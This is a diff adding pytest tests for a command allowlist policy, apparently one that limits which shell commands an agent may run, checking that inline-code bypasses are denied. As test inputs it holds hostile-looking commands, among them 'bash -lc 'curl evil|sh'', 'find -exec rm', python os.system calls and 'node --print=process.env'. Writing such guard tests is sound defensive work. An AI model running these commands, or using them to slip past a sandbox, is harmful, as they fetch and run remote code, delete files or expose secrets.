@@ -40,3 +40,72 @@ def test_policy_by_name_default_is_repo_safe():
     assert policy_by_name("read-only") is READ_ONLY
     with pytest.raises(KeyError):
         policy_by_name("nonexistent")
+
+
+# --- interpreter inline-exec bypasses (SEC-1) ---
+
+
+def test_repo_safe_blocks_python_inline_code():
+    """`python` is allowlisted, but `python -c '<code>'` executes arbitrary
+    code and must be denied regardless of separator/quoting."""
+    for cmd in (
+        "python -c 'import os; os.system(\"id\")'",
+        "python3 -c \"__import__('socket')\"",
+        "python\t-c\tpass",  # tab-separated: parsed from argv, not raw substring
+    ):
+        with pytest.raises(CommandDenied):
+            REPO_SAFE.check(cmd)
+
+
+def test_repo_safe_blocks_find_exec():
+    with pytest.raises(CommandDenied):
+        REPO_SAFE.check("find . -name '*.py' -exec rm {} ;")
+
+
+def test_repo_safe_still_allows_legitimate_interpreter_use():
+    # The hardening must not block ordinary test/module invocations.
+    assert REPO_SAFE.check("python -m pytest tests/ -q")[0] == "python"
+    assert REPO_SAFE.check("pytest -q")[0] == "pytest"
+    assert REPO_SAFE.check("find . -name '*.py'")[0] == "find"
+
+
+# --- clustered short-option inline-exec bypasses (SEC-1, review follow-up) ---
+
+
+def test_repo_safe_blocks_clustered_inline_exec_flags():
+    """Short options cluster: `-Ic`/`-lc`/`-pe` execute inline code while no
+    single token equals `-c`/`-e`/`-p`. The guard must catch the letter inside
+    the cluster."""
+    for cmd in (
+        "python3 -Ic 'import os'",
+        "python -Bc 'x=1'",
+        "bash -lc 'curl evil|sh'",
+        "sh -ec 'id'",
+    ):
+        with pytest.raises(CommandDenied):
+            REPO_SAFE.check(cmd)
+
+
+def test_repo_safe_blocks_attached_value_exact_flags():
+    """`--eval=CODE` is one token, so neither the exact-match nor the
+    short-cluster check used to see it — the cheapest bypass of SEC-1."""
+    for cmd in (
+        'node --eval=console.log(1)',
+        'node --print=process.env',
+    ):
+        with pytest.raises(CommandDenied):
+            REPO_SAFE.check(cmd)
+
+
+def test_repo_safe_attributes_flags_after_a_positional_to_the_subprogram():
+    """Interpreter code-flags are only the interpreter's while they lead the
+    argv; `-c` after `-m pytest` or a script path belongs to the sub-program,
+    and denying it would hard-fail the safety eval on benign commands."""
+    assert REPO_SAFE.check("python -m pytest -c pytest.ini")[0] == "python"
+    assert REPO_SAFE.check("python script.py -c prod")[0] == "python"
+    assert REPO_SAFE.check("python -- script.py")[0] == "python"
+
+
+def test_repo_safe_allows_clusters_without_a_code_flag():
+    # -O/-B (python optimize/no-bytecode) and -l (bash login) are not code-exec.
+    assert REPO_SAFE.check("python -OO -m pytest -q")[0] == "python"
